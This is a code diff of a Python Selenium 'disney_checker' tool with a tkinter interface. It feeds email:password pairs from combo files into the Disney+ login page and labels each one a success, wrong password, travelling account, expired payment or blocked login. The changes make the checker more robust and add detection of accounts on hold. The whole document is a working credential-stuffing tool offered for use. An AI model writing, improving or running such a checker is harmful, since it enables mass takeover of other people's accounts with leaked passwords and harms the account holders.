@@ -12,18 +12,18 @@ from tkinter import *
 from tkinter import ttk
 from tkinter.ttk import *
 from bs4 import BeautifulSoup as soup
-from selenium.common.exceptions import TimeoutException, WebDriverException
+from selenium.common.exceptions import TimeoutException, WebDriverException, NoSuchElementException
 from selenium.webdriver.chrome.options import Options
 from selenium import webdriver
 from pathlib import Path
 
 class disney_checker():
 
-	def __init__(self, root):
+	def __init__(self, root, background_colour):
 		
-		self.information_bar = Canvas(root, bg='skyblue3')
+		self.information_bar = Canvas(root, bg=background_colour)
 		self.information_bar.place(x=58,y=238,width=681,height=38)
-		self.infobox = Text(root, bg='skyblue3',font=('Arial',11))
+		self.infobox = Text(root, bg= background_colour,font=('Arial',11))
 		self.file_directory = str(Path(__file__).parents[1])+'/disney'
 		self.page = 'https://www.disneyplus.com/login'
 		self.users = []
@@ -31,16 +31,16 @@ class disney_checker():
 		self.Two_Factor = False
 		self.browser_options = Options()
 		self.browser_options.add_argument = ('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36')		
-		self.browser_options.headless = True
+		#self.browser_options.headless = True
 		self.start_checker = Button(root, text = 'Start Checker',command = self.account_checker_thread, style='GUI_Buttons.TButton')
 		self.stop_checker = False
 		self.run_only_on_first_checker_instance = True
 		self.index = 0
 		self.error_returned = False
 
-	def split_combo_file(self,root):
+	def split_combo_file(self,root, background_colour):
 	
-		self.split_combos = split_combos(root,'disney')
+		self.split_combos = split_combos(root,'disney',background_colour)
 		
 	def draw_checker_button(self):
 			
@@ -121,17 +121,19 @@ class disney_checker():
 					browser.set_page_load_timeout(15)
 					browser.set_window_size(500,700)
 					browser.get(self.page)
-					time.sleep(9)
-					email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
+					while True:
+						try:
+							email_input_box = browser.find_element_by_xpath('//*[@id="email"]')
+							break
+						except NoSuchElementException:
+							continue
+					time.sleep(3)
 					continue_button = browser.find_element_by_xpath('//*[@id="dssLogin"]/div[2]/button')					
 					email_input_box.send_keys(self.users[self.index])
 					self.information_bar.delete('all')
 					self.information_bar.create_text(75,18,text ='Entering Email...',font=('Arial',12))
 					self.information_bar.update_idletasks()
-					
-					if browser.find_elements_by_xpath('//*[@id="onetrust-reject-all-handler"]'):
-						gdpr_reject_all = browser.find_element_by_xpath('//*[@id="onetrust-reject-all-handler"]')
-						gdpr_reject_all.click()
+
 					continue_button.click()
 					time.sleep(3)
 					
@@ -159,7 +161,9 @@ class disney_checker():
 						self.information_bar.create_text(65,18,text ='Logging in...',font=('Arial',12))
 						self.information_bar.update_idletasks()
 						time.sleep(5)
-
+						if browser.find_elements_by_xpath('//*[@id="onetrust-reject-all-handler"]'):
+							gdpr_reject_all = browser.find_element_by_xpath('//*[@id="onetrust-reject-all-handler"]')
+							gdpr_reject_all.click()
 						if browser.find_elements_by_xpath('//*[@id="app_index"]/div[3]/div/div'):
 								travelling = True
 								self.infobox_message(' | {}:{} ---> Success! (Travelling)\n'.format(self.users[self.index],self.passwords[self.index]))
@@ -169,6 +173,14 @@ class disney_checker():
 								self.infobox_message(" | {}:{} ---> Password is incorrect\n".format(self.users[self.index],self.passwords[self.index]))					
 							if 'Due to' in str(password_or_429_error):
 								self.infobox.insert(END," | Login Blocked.\n")
+							if "We couldn't log you in. Please check your email and password and try again" in str(password_or_429_error):
+								self.infobox_message(" | {}:{} ---> Password is incorrect\n".format(self.users[self.index],self.passwords[self.index]))
+						if browser.find_elements_by_xpath('//*[@id="section_index"]/div/div[2]/div/div[2]/h2'):
+							subscription_on_hold = browser.find_element_by_xpath('//*[@id="section_index"]/div/div[2]/div/div[2]/h2').text
+							if "Resume subscription" in str(subscription_on_hold):
+								self.infobox_message(" | {}:{} ---> Payment Expired\n".format(self.users[self.index],self.passwords[self.index]))
+								
+						
 						if str(browser.current_url)[-4:] == 'home' and travelling == False:
 							self.infobox_message(" | {}:{} ---> Success!\n".format(self.users[self.index],self.passwords[self.index]))
 						if browser.find_elements_by_xpath('//*[@id="remove-main-padding_index"]/div/div/section/h2'):
@@ -186,7 +198,7 @@ class disney_checker():
 					self.information_bar.create_text(75,18,text ='Error: No Internet',font=('Arial',12))
 					self.infobox_message("\n\nCan't connect, please check your connection and try again.")
 					break
-					
+				
 				except TimeoutException:
 					self.infobox_message(' | {}:{} ---> Timed Out\n')
 					break
@@ -201,8 +213,4 @@ class disney_checker():
 	
 	def account_checker_thread(self):
 		threading.Thread(target=self.check_the_accounts,args=()).start()
-		
-'''if browser.find_elements_by_xpath('//*[@id="app_index"]/div[3]/div/div/h4'):
-							travelling_warning = browser.find_element_by_xpath('//*[@id="app_index"]/div[3]/div/div/h4').text
-							if 'Looks like' in str(travelling_warning):
-								self.infobox_message(' | {}:{} ---> Success! (Travelling)\n'.format(self.users[self.index],self.passwords[self.index]))'''
+
